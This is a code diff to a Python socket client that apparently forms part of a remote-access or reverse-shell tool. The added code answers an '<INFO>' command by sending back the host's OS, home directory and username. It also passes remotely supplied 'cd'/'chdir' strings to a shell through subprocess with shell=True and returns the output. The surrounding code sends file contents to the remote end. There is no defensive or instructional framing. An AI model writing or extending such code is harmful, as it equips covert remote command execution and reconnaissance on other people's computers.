@@ -219,6 +219,10 @@ class Client(object):
             # data[2]: data2
             # ...
 
+            if data[0] == '<INFO>':
+                self.send(json.dumps([platform.system(), os.path.expanduser('~'), os.getlogin()]).encode())
+                continue 
+
             if data[0] == '--l':
                 self.socket.send(b' ')
                 continue
@@ -311,13 +315,29 @@ class Client(object):
                     self.send(f.read())
                 continue
 
-            if data[0][:2].lower() == 'cd':
-                try:
-                    directory = data[0][3:]
-                    os.chdir(directory.strip())
-                except Exception as e:
-                    logging.debug('Error changing cd: {}'.format(str(e)))
+            if data[0] == '<GETCWD>':
                 self.send(os.getcwdb())
+                continue
+
+            if data[0] == 'cd':
+                self.send(os.getcwdb())
+                continue
+
+            if data[0][:2].lower() == 'cd' or data[0][:5] == 'chdir':
+                process = subprocess.Popen(data[0] + ' & cd', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                error = process.stderr.read().decode()
+                if error == "":
+                    output = process.stdout.read().decode()
+                    cd_dir = output.splitlines()[0]
+                    try:
+                        os.chdir(cd_dir)
+                    except:
+                        # This is usually 'cd /?'
+                        self.send(json.dumps(['<ERROR>', output.rsplit('\n', 3)[0]]).encode())
+                        continue
+                    self.send(json.dumps([os.getcwd()]).encode())
+                else:
+                    self.send(json.dumps(['<ERROR>', error]).encode())
                 continue
 
             if len(data[0]) > 0:
